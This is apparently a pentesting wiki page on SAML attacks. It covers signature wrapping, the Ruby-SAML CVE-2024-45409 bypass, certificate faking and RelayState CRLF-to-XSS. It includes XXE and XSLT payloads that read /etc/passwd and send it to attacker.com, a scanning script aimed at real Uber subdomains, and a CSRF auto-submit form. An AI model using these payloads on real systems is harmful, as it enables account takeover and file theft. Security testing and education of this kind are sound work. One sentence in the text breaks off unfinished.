_body: "# SAML Attacks\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## Basic Information\n\n\n{{#ref}}\nsaml-basics.md\n\
  {{#endref}}\n\n## Tool\n\n[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor): A tool that can take a URL or\
  \ list of URL and prints back SAML consume URL.\n\n## XML round-trip\n\nIn XML the signed part of the XML is saved in memory,\
  \ then some encoding/decoding is performed and the signature is checked. Ideally that encoding/decoding shouldn't change\
  \ the data but based in that scenario, **the data being checked and the original data could not be the same**.\n\nFor example,\
  \ check the following code:\n\n```ruby\nrequire 'rexml/document'\n\ndoc = REXML::Document.new <<XML\n<!DOCTYPE x [ <!NOTATION\
  \ x SYSTEM 'x\">]><!--'> ]>\n<X>\n  <Y/><![CDATA[--><X><Z/><!--]]]>\n</X>\nXML\n\nputs \"First child in original doc: \"\
  \ + doc.root.elements[1].name\ndoc = REXML::Document.new doc.to_s\nputs \"First child after round-trip: \" + doc.root.elements[1].name\n\
  ```\n\nRunning the program against REXML 3.2.4 or earlier would result in the following output instead:\n\n```\nFirst child\
  \ in original doc: Y\nFirst child after round-trip: Z\n```\n\nThis is how REXML saw the original XML document from the program\
  \ above:\n\n![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../images/image (1001).png>)\n\
  \nAnd this is how it saw it after a round of parsing and serialization:\n\n![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../images/image\

  \ Signature Wrapping Attacks\n\nIn **XML Signature Wrapping attacks (XSW)**, adversaries exploit a vulnerability arising\
  \ when XML documents are processed through two distinct phases: **signature validation** and **function invocation**. These\
  \ attacks involve altering the XML document structure. Specifically, the attacker **injects forged elements** that do not\
  \ compromise the XML Signature's validity. This manipulation aims to create a discrepancy between the elements analyzed\
  \ by the **application logic** and those checked by the **signature verification module**. As a result, while the XML Signature\
  \ remains technically valid and passes verification, the application logic processes the **fraudulent elements**. Consequently,\
  \ the attacker effectively bypasses the XML Signature's **integrity protection** and **origin authentication**, enabling\
  \ the **injection of arbitrary content** without detection.\n\nThe following attacks ara based on [**this blog post**](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)\
  \ **and** [**this paper**](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf). So check\
  \ those for further details.\n\n### XSW #1\n\n- **Strategy**: A new root element containing the signature is added.\n- **Implication**:\
  \ The validator may get confused between the legitimate \"Response -> Assertion -> Subject\" and the attacker's \"evil new\
  \ Response -> Assertion -> Subject\", leading to data integrity issues.\n\n![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-1.svg](<../../images/image\
  \ (506).png>)\n\n### XSW #2\n\n- **Difference from XSW #1**: Utilizes a detached signature instead of an enveloping signature.\n\
  - **Implication**: The \"evil\" structure, similar to XSW #1, aims to deceive the business logic post integrity check.\n\
  \n![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-2.svg](<../../images/image (466).png>)\n\n### XSW #3\n\n- **Strategy**:\
  \ An evil Assertion is crafted at the same hierarchical level as the original assertion.\n- **Implication**: Intends to\
  \ confuse the business logic into using the malicious data.\n\n![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-3.svg](<../../images/image\
  \ (120).png>)\n\n### XSW #4\n\n- **Difference from XSW #3**: The original Assertion becomes a child of the duplicated (evil)\
  \ Assertion.\n- **Implication**: Similar to XSW #3 but alters the XML structure more aggressively.\n\n![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-4.svg](<../../images/image\
  \ (551).png>)\n\n### XSW #5\n\n- **Unique Aspect**: Neither the Signature nor the original Assertion adhere to standard\
  \ configurations (enveloped/enveloping/detached).\n- **Implication**: The copied Assertion envelopes the Signature, modifying\
  \ the expected document structure.\n\n![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-5.svg](<../../images/image (1030).png>)\n\
  \n### XSW #6\n\n- **Strategy**: Similar location insertion as XSW #4 and #5, but with a twist.\n- **Implication**: The copied\
  \ Assertion envelopes the Signature, which then envelopes the original Assertion, creating a nested deceptive structure.\n\
  \n![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-6.svg](<../../images/image (169).png>)\n\n### XSW #7\n\n- **Strategy**:\
  \ An Extensions element is inserted with the copied Assertion as a child.\n- **Implication**: This exploits the less restrictive\
  \ schema of the Extensions element to bypass schema validation countermeasures, especially in libraries like OpenSAML.\n\
  \n![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-7.svg](<../../images/image (971).png>)\n\n### XSW #8\n\n- **Difference\
  \ from XSW #7**: Utilizes another less restrictive XML element for a variant of the attack.\n- **Implication**: The original\
  \ Assertion becomes a child of the less restrictive element, reversing the structure used in XSW #7.\n\n![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-8.svg](<../../images/image\
  \ (541).png>)\n\n### Tool\n\nYou can use the Burp extension [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)\
  \ to parse the request, apply any XSW attack you choose, and launch it.\n\n## Ruby-SAML signature verification bypass (CVE-2024-45409)\n\
  \n**Impact**: If the Service Provider uses vulnerable Ruby-SAML (ex. GitLab SAML SSO), an attacker who can obtain **any\
  \ IdP-signed SAMLResponse** can **forge a new assertion** and authenticate as arbitrary users.\n\n**High-level workflow**\
  \ (signature-wrapping style bypass):\n\n1. Capture a **legitimate SAMLResponse** in the SSO POST (Burp or browser devtools).\
  \ You only need any IdP-signed response for the target SP.\n2. Decode the transport encoding to raw XML (typical order):\
  \ **URL decode → Base64 decode → raw inflate**.\n3. Use a PoC (for example, the Synacktiv script) to **patch IDs/NameID/conditions**\
  \ and **rewrite signature references/digests** so validation still passes while the SP consumes attacker-controlled assertion\
  \ fields.\n4. Re-encode the patched XML (**raw deflate → Base64 → URL encode**) and replay it to the SAML callback endpoint.\
  \ If successful, the SP logs you in as the chosen user.\n\nExample using the Synacktiv PoC (input is the captured SAMLResponse\
  \ blob):\n\n```bash\npython3 CVE-2024-45409.py -r response.url_base64 -n admin@example.com -o response_patched.url_base64\n\
  ```\n\n## XXE\n\nIf you don't know which kind of attacks are XXE, please read the following page:\n\n\n{{#ref}}\n../xxe-xee-xml-external-entity.md\n\
  {{#endref}}\n\nSAML Responses are **deflated and base64 encoded XML documents** and can be susceptible to XML External Entity\
  \ (XXE) attacks. By manipulating the XML structure of the SAML Response, attackers can attempt to exploit XXE vulnerabilities.\
  \ Here’s how such an attack can be visualized:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n <!DOCTYPE foo [\n\
  \   <!ELEMENT foo ANY >\n   <!ENTITY    file SYSTEM \"file:///etc/passwd\">\n   <!ENTITY dtd SYSTEM \"http://www.attacker.com/text.dtd\"\
  \ >]>\n  <samlp:Response ... ID=\"_df55c0bb940c687810b436395cf81760bb2e6a92f2\" ...>\n  <saml:Issuer>...</saml:Issuer>\n\
  \  <ds:Signature ...>\n    <ds:SignedInfo>\n      <ds:CanonicalizationMethod .../>\n      <ds:SignatureMethod .../>\n  \
  \    <ds:Reference URI=\"#_df55c0bb940c687810b436395cf81760bb2e6a92f2\">...</ds:Reference>\n    </ds:SignedInfo>\n    <ds:SignatureValue>...</ds:SignatureValue>\n\
  [...]\n```\n\n## Tools\n\nYou can also use the Burp extension [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)\
  \ to generate the POC from a SAML request to test for possible XXE vulnerabilities and SAML vulnerabilities.\n\nCheck also\
  \ this talk: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)\n\n## XSLT via SAML\n\
  \nFor more information about XSLT go to:\n\n\n{{#ref}}\n../xslt-server-side-injection-extensible-stylesheet-language-transformations.md\n\
  {{#endref}}\n\nExtensible Stylesheet Language Transformations (XSLT) can be used for transforming XML documents into various\
  \ formats like HTML, JSON, or PDF. It's crucial to note that **XSLT transformations are performed before the verification\
  \ of the digital signature**. This means that an attack can be successful even without a valid signature; a self-signed\
  \ or invalid signature is sufficient to proceed.\n\nHere you can find a **POC** to check for this kind of vulnerabilities,\
  \ in the hacktricks page mentioned at the beginning of this section you can find for payloads.\n\n```xml\n<ds:Signature\
  \ xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\">\n  ...\n    <ds:Transforms>\n      <ds:Transform>\n        <xsl:stylesheet\
  \ xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">\n          <xsl:template match=\"doc\">\n            <xsl:variable\
  \ name=\"file\" select=\"unparsed-text('/etc/passwd')\"/>\n            <xsl:variable name=\"escaped\" select=\"encode-for-uri($file)\"\
  />\n            <xsl:variable name=\"attackerUrl\" select=\"'http://attacker.com/'\"/>\n            <xsl:variable name=\"\
  exploitUrl\" select=\"concat($attackerUrl,$escaped)\"/>\n            <xsl:value-of select=\"unparsed-text($exploitUrl)\"\
  />\n          </xsl:template>\n        </xsl:stylesheet>\n      </ds:Transform>\n    </ds:Transforms>\n  ...\n</ds:Signature>\n\
  ```\n\n### Tool\n\nYou can also use the Burp extension [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)\
  \ to generate the POC from a SAML request to test for possible XSLT vulnerabilities.\n\nCheck also this talk: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)\n\
  \n## XML Signature Exclusion <a href=\"#xml-signature-exclusion\" id=\"xml-signature-exclusion\"></a>\n\nThe **XML Signature\
  \ Exclusion** observes the behavior of SAML implementations when the Signature element is not present. If this element is\
  \ missing, **signature validation may not occur**, making it vulnerable. It's possibel to test this by altering the contents\
  \ that are usually verified by the signature.\n\n![https://epi052.gitlab.io/notes-to-self/img/saml/signature-exclusion.svg](<../../images/image\
  \ (457).png>)\n\n### Tool <a href=\"#xml-signature-exclusion-how-to\" id=\"xml-signature-exclusion-how-to\"></a>\n\nYou\
  \ can also use the Burp extension [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e).\
  \ Intercept the SAML Response and click `Remove Signatures`. In doing so **all** Signature elements are removed.\n\nWith\
  \ the signatures removed, allow the request to proceed to the target. If the Signature isn’t required by the Service\n\n\
  ## Certificate Faking <a href=\"#certificate-faking\" id=\"certificate-faking\"></a>\n\n## Certificate Faking\n\nCertificate\
  \ Faking is a technique to test if a **Service Provider (SP) properly verifies that a SAML Message is signed** by a trusted\
  \ Identity Provider (IdP). It involves using a \\***self-signed certificate** to sign the SAML Response or Assertion, which\
  \ helps in evaluating the trust validation process between SP and IdP.\n\n### How to Conduct Certificate Faking\n\nThe following\
  \ steps outline the process using the [SAML Raider](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)\
  \ Burp extension:\n\n1. Intercept the SAML Response.\n2. If the response contains a signature, send the certificate to SAML\
  \ Raider Certs using the `Send Certificate to SAML Raider Certs` button.\n3. In the SAML Raider Certificates tab, select\
  \ the imported certificate and click `Save and Self-Sign` to create a self-signed clone of the original certificate.\n4.\
  \ Go back to the intercepted request in Burp’s Proxy. Select the new self-signed certificate from the XML Signature dropdown.\n\
  5. Remove any existing signatures with the `Remove Signatures` button.\n6. Sign the message or assertion with the new certificate\
  \ using the **`(Re-)Sign Message`** or **`(Re-)Sign Assertion`** button, as appropriate.\n7. Forward the signed message.\
  \ Successful authentication indicates that the SP accepts messages signed by your self-signed certificate, revealing potential\
  \ vulnerabilities in the validation process of the SAML messages.\n\n## Token Recipient Confusion / Service Provider Target\
  \ Confusion <a href=\"#token-recipient-confusion\" id=\"token-recipient-confusion\"></a>\n\nToken Recipient Confusion and\
  \ Service Provider Target Confusion involve checking whether the **Service Provider correctly validates the intended recipient\
  \ of a response**. In essence, a Service Provider should reject an authentication response if it was meant for a different\
  \ provider. The critical element here is the **Recipient** field, found within the **SubjectConfirmationData** element of\
  \ a SAML Response. This field specifies a URL indicating where the Assertion must be sent. If the actual recipient does\
  \ not match the intended Service Provider, the Assertion should be deemed invalid.\n\n#### **How It Works**\n\nFor a SAML\
  \ Token Recipient Confusion (SAML-TRC) attack to be feasible, certain conditions must be met. Firstly, there must be a valid\
  \ account on a Service Provider (referred to as SP-Legit). Secondly, the targeted Service Provider (SP-Target) must accept\
  \ tokens from the same Identity Provider that serves SP-Legit.\n\nThe attack process is straightforward under these conditions.\
  \ An authentic session is initiated with SP-Legit via the shared Identity Provider. The SAML Response from the Identity\
  \ Provider to SP-Legit is intercepted. This intercepted SAML Response, originally intended for SP-Legit, is then redirected\
  \ to SP-Target. Success in this attack is measured by SP-Target accepting the Assertion, granting access to resources under\
  \ the same account name used for SP-Legit.\n\n```python\n# Example to simulate interception and redirection of SAML Response\n\
  def intercept_and_redirect_saml_response(saml_response, sp_target_url):\n    \"\"\"\n    Simulate the interception of a\
  \ SAML Response intended for SP-Legit and its redirection to SP-Target.\n\n    Args:\n    - saml_response: The SAML Response\
  \ intercepted (in string format).\n    - sp_target_url: The URL of the SP-Target to which the SAML Response is redirected.\n\
  \n    Returns:\n    - status: Success or failure message.\n    \"\"\"\n    # This is a simplified representation. In a real\
  \ scenario, additional steps for handling the SAML Response would be required.\n    try:\n        # Code to send the SAML\
  \ Response to SP-Target would go here\n        return \"SAML Response successfully redirected to SP-Target.\"\n    except\
  \ Exception as e:\n        return f\"Failed to redirect SAML Response: {e}\"\n```\n\n## XSS in Logout functionality\n\n\
  The original research can be accessed through [this link](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/).\n\
  \nDuring the process of directory brute forcing, a logout page was discovered at:\n\n```\nhttps://carbon-prototype.uberinternal.com:443/oidauth/logout\n\
  ```\n\nUpon accessing this link, a redirection occurred to:\n\n```\nhttps://carbon-prototype.uberinternal.com/oidauth/prompt?base=https%3A%2F%2Fcarbon-prototype.uberinternal.com%3A443%2Foidauth&return_to=%2F%3Fopenid_c%3D1542156766.5%2FSnNQg%3D%3D&splash_disabled=1\n\
  ```\n\nThis revealed that the `base` parameter accepts a URL. Considering this, the idea emerged to substitute the URL with\
  \ `javascript:alert(123);` in an attempt to initiate an XSS (Cross-Site Scripting) attack.\n\n### Mass Exploitation\n\n\
  [From this research](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/):\n\nThe [**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor)\
  \ tool was used to analyze subdomains of `uberinternal.com` for domains utilizing the same library. Subsequently, a script\
  \ was developed to target the `oidauth/prompt` page. This script tests for XSS (Cross-Site Scripting) by inputting data\
  \ and checking if it's reflected in the output. In cases where the input is indeed reflected, the script flags the page\
  \ as vulnerable.\n\n```python\nimport requests\nimport urllib3\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\
  from colorama import init ,Fore, Back, Style\ninit()\n\nwith open(\"/home/fady/uberSAMLOIDAUTH\") as urlList:\n        \
  \    for url in urlList:\n                url2 = url.strip().split(\"oidauth\")[0] + \"oidauth/prompt?base=javascript%3Aalert(123)%3B%2F%2FFady&return_to=%2F%3Fopenid_c%3D1520758585.42StPDwQ%3D%3D&splash_disabled=1\"\
  \n                request = requests.get(url2, allow_redirects=True,verify=False)\n                doesit = Fore.RED + \"\
  no\"\n                if (\"Fady\" in request.content):\n                    doesit = Fore.GREEN + \"yes\"\n           \
  \     print(Fore.WHITE + url2)\n                print(Fore.WHITE + \"Len : \" + str(len(request.content)) + \"   Vulnerable\
  \ : \" + doesit)\n```\n\n## RelayState-based header/body injection to rXSS\n\nSome SAML SSO endpoints decode `RelayState`\
  \ and then reflect it into the response without sanitization. If you can inject newlines and override the response `Content-Type`,\
  \ you can force the browser to render attacker-controlled HTML, achieving reflected XSS.\n\n- Idea: abuse response-splitting\
  \ via newline injection in the reflected RelayState. See also the generic notes in [CRLF injection](../crlf-0d-0a.md).\n\
  - Works even when RelayState is base64-decoded server-side: supply a base64 that decodes to header/body injection.\n\nGeneralized\
  \ steps:\n\n1. Build a header/body injection sequence starting with a newline, overwrite content type to HTML, then inject\
  \ HTML/JS payload:\n   \n   Concept:\n   \n   ```text\n   \\n\n   Content-Type: text/html\n   \n   \n   <svg/onload=alert(1)>\n\
  \   ```\n2. URL-encode the sequence (example):\n   \n   ```text\n   %0AContent-Type%3A+text%2Fhtml%0A%0A%0A%3Csvg%2Fonload%3Dalert(1)%3E\n\
  \   ```\n3. Base64-encode that URL-encoded string and place it in `RelayState`.\n   \n   Example base64 (from the sequence\
  \ above):\n   \n   ```text\n   DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KDQoNCjxzdmcvb25sb2FkPWFsZXJ0KDEpPg==\n   ```\n4. Send\
  \ a POST with a syntactically valid `SAMLResponse` and the crafted `RelayState` to the SSO endpoint (e.g., `/cgi/logout`).\n\
  5. Deliver via CSRF: host a page that auto-submits a cross-origin POST to the target origin including both fields.\n\nPoC\
  \ against a NetScaler SSO endpoint (`/cgi/logout`):\n\n```http\nPOST /cgi/logout HTTP/1.1\nHost: target\nContent-Type: application/x-www-form-urlencoded\n\
  \nSAMLResponse=[BASE64-Generic-SAML-Response]&RelayState=DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KDQoNCjxzdmcvb25sb2FkPWFsZXJ0KDEpPg==\n\
  ```\n\nCSRF delivery pattern:\n\n```html\n<form action=\"https://target/cgi/logout\" method=\"POST\" id=\"p\">\n  <input\
  \ type=\"hidden\" name=\"SAMLResponse\" value=\"[BASE64-Generic-SAML-Response]\">\n  <input type=\"hidden\" name=\"RelayState\"\
  \ value=\"DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KDQoNCjxzdmcvb25sb2FkPWFsZXJ0KDEpPg==\">\n</form>\n<script>document.getElementById('p').submit()</script>\n\
  ```\n\nWhy it works: the server decodes `RelayState` and incorporates it into the response in a way that permits newline\
  \ injection, letting the attacker influence headers and body. Forcing `Content-Type: text/html` causes the browser to render\
  \ the attacker-controlled HTML from the response body.\n\n## References\n\n- [https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)\n\
